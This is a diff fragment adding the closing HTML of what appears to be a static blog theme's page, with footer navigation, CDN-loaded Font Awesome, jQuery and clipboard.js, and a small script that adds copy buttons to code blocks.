+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
